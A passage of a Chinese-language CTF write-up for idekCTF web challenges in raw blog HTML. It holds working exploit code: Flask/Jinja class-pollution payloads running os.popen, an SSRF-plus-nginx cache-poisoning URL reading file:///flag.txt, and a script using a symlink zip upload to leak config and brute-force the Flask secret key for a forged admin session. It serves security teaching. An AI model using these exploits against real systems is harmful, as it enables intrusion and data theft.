class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payloads = &#123;</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.env&quot;</span>: <span class="string">&quot;yolo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value&quot;</span>: <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag-*.txt&#x27;).read()&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;</span>: hijack_start,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string&quot;</span>: hijack_end,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;</span>: <span class="string">&quot;ZZZ&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._got_first_request&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite</span>(<span class="params">attr, value</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&quot;task&quot;</span>: attr, <span class="string">&quot;status&quot;</span>: value&#125;</span><br><span class="line">    requests.post(base_url + <span class="string">&quot;/api/manage_tasks&quot;</span>, json=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    url = base_url + <span class="string">&quot;/../../usr/local/lib/python3.8/turtle.py&quot;</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=url)</span><br><span class="line">    prep = r.prepare()</span><br><span class="line">    prep.url = url</span><br><span class="line">    r = s.send(prep)</span><br><span class="line">    flag = re.findall(<span class="string">&#x27;idek&#123;.*&#125;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> payloads.items():</span><br><span class="line">    overwrite(k, v)</span><br><span class="line"></span><br><span class="line">get_flag()</span><br></pre></td></tr></table></figure><h5 id="姿势2-1"><a href="#姿势2-1" class="headerlink" title="姿势2"></a>姿势2</h5><p>学习自国外友人<a target="_blank" rel="noopener" href="https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager">https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager</a></p><p>从编译入手很秀,在生成模板的过程中<code>jinja2.compiler.CodeGenerator.visit_Template</code></p><p>如果我们污染了exported变量那么就可以控制模板的生成</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117204159912.png" alt="image-20230117204159912"></p><p>正好是可以的</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117204310119.png" alt="image-20230117204310119"></p><p>之后访问渲染任意模板的时候就能触发RCE，很厉害！</p><h2 id="Proxy-viewer"><a href="#Proxy-viewer" class="headerlink" title="Proxy viewer"></a>Proxy viewer</h2><p>比较有意思的题目，首先看看app.py中关键路由部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(</span><br><span class="line">        __name__,</span><br><span class="line">        static_url_path=<span class="string">&#x27;/static&#x27;</span>,</span><br><span class="line">        static_folder=<span class="string">&#x27;./static&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">PREMIUM_TOKEN = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">limiter = Limiter(app, key_func=get_remote_address)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_headers</span>(<span class="params">response</span>):</span></span><br><span class="line">    response.cache_control.max_age = <span class="number">120</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;10/minute&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy</span>(<span class="params">path</span>):</span></span><br><span class="line">    remote_addr = request.headers.get(<span class="string">&#x27;X-Forwarded-For&#x27;</span>) <span class="keyword">or</span> request.remote_addr</span><br><span class="line">    is_authorized = request.headers.get(<span class="string">&#x27;X-Premium-Token&#x27;</span>) == PREMIUM_TOKEN <span class="keyword">or</span> remote_addr == <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        page = urlopen(path, timeout=<span class="number">.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;proxy.html&#x27;</span>, auth=is_authorized)</span><br><span class="line">    <span class="keyword">if</span> is_authorized:</span><br><span class="line">        output = page.read().decode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output = <span class="string">f&quot;&lt;pre&gt;<span class="subst">&#123;page.headers.as_string()&#125;</span>&lt;/pre&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;proxy.html&#x27;</span>, auth=is_authorized, content=output)</span><br></pre></td></tr></table></figure><p>其中比较关键的是这个<code>/proxy</code>路由，存在一个ssrf漏洞，但是必须<code>is_authorized</code>为<code>true</code>才会返回全部结果，否则只返回响应头</p><p>另一个关键的地方就是nginx的配置，可以看见如果以/static/开头那么就会缓存对应页面内容</p><p>同时可以看到对/开头的所有请求都会增加一个XFF头，因此对于上面的remote_addr我们无法进行伪造，因为nginx对此处理是追加ip，比如(<code>XFF:127.0.0.1,readlip</code>)</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span> mime.types;</span><br><span class="line">    <span class="attribute">proxy_cache_path</span> /tmp/nginx keys_zone=my_zone:<span class="number">10m</span> inactive=<span class="number">60m</span> use_temp_path=<span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">listen</span> <span class="number">1337</span>;</span><br><span class="line">        <span class="attribute">client_max_body_size</span> <span class="number">64M</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host $http_host;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span><span class="regexp"> ^~</span> /static/ &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host $http_host;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">	    <span class="attribute">proxy_cache</span> my_zone;</span><br><span class="line">	    <span class="attribute">add_header</span> X-Proxy-Cache $upstream_cache_status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还要用到一个trick就是，urlopen内部处理时会在<code>urllib.request.Request.full_url</code>中去除#后面部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@full_url.setter</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">full_url</span>(<span class="params">self, url</span>):</span></span><br><span class="line">  <span class="comment"># unwrap(&#x27;&lt;URL:type://host/path&gt;&#x27;) --&gt; &#x27;type://host/path&#x27;</span></span><br><span class="line">  self._full_url = unwrap(url)</span><br><span class="line">  self._full_url, self.fragment = _splittag(self._full_url)</span><br><span class="line">  self._parse()</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_splittag</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;splittag(&#x27;/path#tag&#x27;) --&gt; &#x27;/path&#x27;, &#x27;tag&#x27;.&quot;&quot;&quot;</span></span><br><span class="line">    path, delim, tag = url.rpartition(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> delim:</span><br><span class="line">        <span class="keyword">return</span> path, tag</span><br><span class="line">    <span class="keyword">return</span> url, <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>因此配合这个trick，我们先访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a</span><br></pre></td></tr></table></figure><p>此时flask会把<code>file%3a///flag.txt%2523/../../../static/a</code>整体当作</p><p>而nginx则会对url做normalize处理，最终导致nginx识别请求为<code>http://127.0.0.1:1337/static/a</code></p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230119110043007.png" alt="image-20230119110043007"></p><p>再访问即可触发缓存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a</span><br></pre></td></tr></table></figure><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230119110111302.png" alt="image-20230119110111302"></p><h2 id="SimpleFileServer"><a href="#SimpleFileServer" class="headerlink" title="SimpleFileServer"></a>SimpleFileServer</h2><p>也是python的flask的题目</p><p>可以看到获得flag的条件，那就是成为admin，所以很容易猜测到考点是session伪造，而flask里面这个session的生成通常和变量<code>app.config[&quot;SECRET_KEY&quot;]</code>息息相关</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;admin&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.run(<span class="string">&quot;./flag&quot;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure><p>因此一切的前提是我们能获得这个<code>SECRET_KEY</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = os.environ[<span class="string">&quot;SECRET_KEY&quot;</span>]</span><br></pre></td></tr></table></figure><p>而这部分生成在config.py当中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SECRET_OFFSET = <span class="number">0</span> <span class="comment"># REDACTED</span></span><br><span class="line">random.seed(<span class="built_in">round</span>((time.time() + SECRET_OFFSET) * <span class="number">1000</span>))</span><br><span class="line">os.environ[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;&quot;</span>.join([<span class="built_in">hex</span>(random.randint(<span class="number">0</span>, <span class="number">15</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>要爆破这部分很明显一是我们需要知道这个<code>time.time()</code>的值，另一个还需要知道<code>SECRET_OFFSET</code>的偏移</p><p>除开注册与登录路由，upoad支持上传一个zip文件并解压到指定目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;uid&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;file&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        flash(<span class="string">&quot;You didn&#x27;t upload a file!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">    uuidpath = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    filename = <span class="string">f&quot;<span class="subst">&#123;DATA_DIR&#125;</span>uploadraw/<span class="subst">&#123;uuidpath&#125;</span>.zip&quot;</span></span><br><span class="line">    file.save(filename)</span><br><span class="line">    subprocess.call([<span class="string">&quot;unzip&quot;</span>, filename, <span class="string">&quot;-d&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;DATA_DIR&#125;</span>uploads/<span class="subst">&#123;uuidpath&#125;</span>&quot;</span>])    </span><br><span class="line">    flash(<span class="string">f&#x27;Your unique ID is &lt;a href=&quot;/uploads/<span class="subst">&#123;uuidpath&#125;</span>&quot;&gt;<span class="subst">&#123;uuidpath&#125;</span>&lt;/a&gt;!&#x27;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">    logger.info(<span class="string">f&quot;User <span class="subst">&#123;session.get(<span class="string">&#x27;uid&#x27;</span>)&#125;</span> uploaded file <span class="subst">&#123;uuidpath&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/upload&quot;</span>)</span><br></pre></td></tr></table></figure><p>uploads/xxx路由支持我们之间读取上传解压后的文件内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploads</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> send_from_directory(DATA_DIR + <span class="string">&quot;uploads&quot;</span>, path)</span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br></pre></td></tr></table></figure><p>这个读文件部分按理说只能读取uploads下的文件，看看底层实现用的是safe_join不支持跨目录读取</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117172800202.png" alt="image-20230117172800202"></p><p>可以看到在这里获取路径path后，最终调用open打开文件并返回内容</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117172906258.png" alt="image-20230117172906258"></p><p>解决方法是可以配合symlink软连接实现任意文件读，这样我们一方面可以读config.py获取<code>SECRET_OFFSET</code></p><p>另一方面为了得到时间</p><p>可以看到题目很良心的在<code>server.log</code>当中输出了time</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">LOG_HANDLER = logging.FileHandler(DATA_DIR + <span class="string">&#x27;server.log&#x27;</span>)</span><br><span class="line">LOG_HANDLER.setFormatter(logging.Formatter(fmt=<span class="string">&quot;[&#123;levelname&#125;] [&#123;asctime&#125;] &#123;message&#125;&quot;</span>, style=<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line">logger = logging.getLogger(<span class="string">&quot;application&quot;</span>)</span><br><span class="line">logger.addHandler(LOG_HANDLER)</span><br><span class="line">logger.propagate = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> handler <span class="keyword">in</span> logging.root.handlers[:]:</span><br><span class="line">    logging.root.removeHandler(handler)</span><br><span class="line">logging.basicConfig(level=logging.WARNING, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s&#x27;</span>)</span><br><span class="line">logging.getLogger().addHandler(logging.StreamHandler())</span><br></pre></td></tr></table></figure><p>不过这个时间不是精确的，通过转换为时间戳我们只能精确到整数部分，不过好在这里随机数的seed是配合round做了取整因此我们就能很容易实现爆破了</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117140247774.png" alt="image-20230117140247774"></p><p>我们可以很方便配合这个信息得到time.time()的值</p><p>本地ln做一个symlink的文件</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117133315792.png" alt="image-20230117133315792"></p><p>之后爆破到<code>SECRET_KEY</code>后，修改admin为true再生成session即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decoded = &#123;<span class="string">&#x27;admin&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;uid&#x27;</span>: userinfo[<span class="string">&#x27;username&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure><p>最终exp，配合<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">flask_unsign</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, re, time, datetime, random</span><br><span class="line"><span class="keyword">import</span> flask_unsign</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">SECRET_OFFSET = -<span class="number">67198624</span> * <span class="number">1000</span></span><br><span class="line">userinfo = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;yyds&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;yyds&quot;</span>&#125;</span><br><span class="line">baseurl = <span class="string">&quot;http://127.0.0.1:1337/&quot;</span></span><br><span class="line">pocZip = <span class="string">&quot;UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA&quot;</span></span><br><span class="line">cookie = <span class="string">&quot;&quot;</span></span><br><span class="line">log_url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    reg_url = baseurl + <span class="string">&quot;register&quot;</span></span><br><span class="line">    sess.post(reg_url, userinfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">global</span> cookie</span><br><span class="line">    set_cookie = sess.post(baseurl + <span class="string">&quot;login&quot;</span>, data=userinfo, allow_redirects=<span class="literal">False</span>).headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">    cookie = set_cookie[<span class="number">8</span>:<span class="number">82</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">global</span> log_url</span><br><span class="line">    log_url = re.search(<span class="string">&#x27;&lt;a href=&quot;/uploads/.*&quot;&gt;&#x27;</span>, sess.post(</span><br><span class="line">        baseurl + <span class="string">&quot;upload&quot;</span>, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;session=<span class="subst">&#123;cookie&#125;</span>&#x27;</span>&#125;,</span><br><span class="line">        files=&#123;<span class="string">&#x27;file&#x27;</span>: base64.b64decode(pocZip)&#125;).text).group()[<span class="number">9</span>:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    server_log = baseurl + log_url + <span class="string">&quot;/server.log&quot;</span></span><br><span class="line">    config = baseurl + log_url + <span class="string">&quot;/config.py&quot;</span></span><br><span class="line">    SECRET_OFFSET = <span class="built_in">int</span>(re.findall(<span class="string">&quot;SECRET_OFFSET = (.*?) # REDACTED&quot;</span>, sess.get(config).text)[<span class="number">0</span>]) * <span class="number">1000</span></span><br><span class="line">    log = sess.get(server_log).text</span><br><span class="line">    now = (time.mktime(datetime.datetime.strptime(log.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>][<span class="number">1</span>:<span class="number">20</span>], <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>).timetuple())) * <span class="number">1000</span></span><br><span class="line">    <span class="keyword">return</span> SECRET_OFFSET,now</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    register()</span><br><span class="line">    login()</span><br><span class="line">    upload()</span><br><span class="line">    SECRET_OFFSET, now = read()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        decoded = &#123;<span class="string">&#x27;admin&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;uid&#x27;</span>: userinfo[<span class="string">&#x27;username&#x27;</span>]&#125;</span><br><span class="line">        random.seed(<span class="built_in">round</span>(now + <span class="built_in">int</span>(SECRET_OFFSET)))</span><br><span class="line">        SECRET_KEY = <span class="string">&quot;&quot;</span>.join([<span class="built_in">hex</span>(random.randint(<span class="number">0</span>, <span class="number">15</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        flag_url = baseurl + <span class="string">&quot;flag&quot;</span></span><br><span class="line">        res = sess.get(flag_url, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;session=<span class="subst">&#123;flask_unsign.sign(decoded, SECRET_KEY)&#125;</span>&#x27;</span>&#125;).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;idek&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(now)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ReadMe"><a href="#ReadMe" class="headerlink" title="ReadMe"></a>ReadMe</h2><p>很简单签到题，算是个逻辑漏洞问题</p><p>这个程序中只有一个路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.HandleFunc(<span class="string">&quot;/just-read-it&quot;</span>, justReadIt)</span><br></pre></td></tr></table></figure><p>首先简单看一下可以得出程序逻辑如果能成功走到justReadIt函数最下方就能获得flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 